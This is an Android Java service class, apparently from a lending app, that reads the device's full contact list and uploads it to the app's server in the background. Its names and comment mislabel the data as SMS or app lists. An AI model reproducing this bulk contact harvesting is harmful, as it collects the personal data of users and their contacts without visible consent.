package com.jike.cashocean.service;

import android.app.IntentService;
import android.content.Intent;

import androidx.annotation.Nullable;

import com.blankj.utilcode.util.SPUtils;
import com.jike.cashocean.Content.KeyValue;
import com.jike.cashocean.model.BaseBean;
import com.jike.cashocean.net.BaseObserver;
import com.jike.cashocean.net.Key;
import com.jike.cashocean.net.RetrofitInit;
import com.jike.cashocean.ui.home.api.ApiHome;
import com.jike.cashocean.util.MapUrlTools;
import com.jike.cashocean.util.PhoneReadUtils;

import java.util.TreeMap;

/**
 * @author Ming
 * @Date on 2019/12/6
 * @Description
 */
public class UserContactService extends IntentService {

    public UserContactService() {
        super("contactService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        uploadSmsRecord();
    }

    private void uploadSmsRecord() {
        String allContact = PhoneReadUtils.getAllContactInfo();
        if (allContact != null) {
            //将短信提交到服务器
            uploadAllSMS(allContact);
        }
    }

    private TreeMap<String, String> getParamesMap(String applist) {
        TreeMap<String, String> paramsMap = new TreeMap<String, String>();
        paramsMap.put("contacts", applist);
        paramsMap.put(Key.SIGN, MapUrlTools.getSign(paramsMap));
        return paramsMap;
    }

    private void uploadAllSMS(String allContact) {

        String appList = PhoneReadUtils.getAllContactInfo();
        ApiHome apiHome = RetrofitInit.getRetrofit("").create(ApiHome.class);
        TreeMap<String, String> paramsMap = getParamesMap(appList);
        apiHome.uploadUserContent(paramsMap)
                .subscribe(new BaseObserver<BaseBean>() {
                    @Override
                    public void onSuccess(BaseBean baseBean) throws Exception {
                        if (baseBean.getRet() == 200) {
//                            SPUtils.getInstance().put(KeyValue.IS_UPLOAD_APPLIST, true);
                        }
                    }

                    @Override
                    public void onFail(Throwable throwable) throws ClassNotFoundException {

                    }
                });
    }
}
